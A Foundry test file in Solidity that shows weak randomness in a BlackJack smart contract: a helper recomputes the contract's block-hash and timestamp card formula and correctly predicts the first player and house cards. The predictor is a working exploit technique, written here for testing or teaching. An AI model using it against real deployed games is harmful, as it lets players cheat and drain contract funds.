
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BlackJack, Deck} from "../src/BlackJack.sol";

contract TestWeakRandomnessBlackJack is Test {
    BlackJack bj;
    address player = address(0xBEEF);

    receive() external payable {}

    function setUp() public {
        bj = new BlackJack();
        vm.deal(player, 10 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber, uint256 blockTimestamp) public {
        vm.assume(blockNumber > 0 && blockNumber < type(uint256).max - 100);
        vm.assume(blockTimestamp > 0 && blockTimestamp < type(uint256).max - 100);

        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        uint8 expectedCard0 = _predictCard(player, 0);
        uint8 expectedCard1 = _predictCard(player, 1);
        uint8 expectedCard2 = _predictCard(player, 2);

        vm.prank(player);
        bj.deal{value: bj.minBet()}();

        uint8 actualPlayer0 = bj.getPlayerCard(0);
        uint8 actualHouse0 = bj.getHouseCard(0);
        uint8 actualPlayer1 = bj.getPlayerCard(1);

        assertEq(actualPlayer0, expectedCard0, "First player card should match predicted value");
        assertEq(actualHouse0, expectedCard1, "First house card should match predicted value");
        assertEq(actualPlayer1, expectedCard2, "Second player card should match predicted value");
    }

    function _predictCard(address _player, uint8 cardNumber) internal view returns (uint8) {
        uint b = block.number;
        uint timestamp = block.timestamp;
        return uint8(
            uint256(
                keccak256(abi.encodePacked(blockhash(b), _player, cardNumber, timestamp))
            ) % 52
        );
    }
}
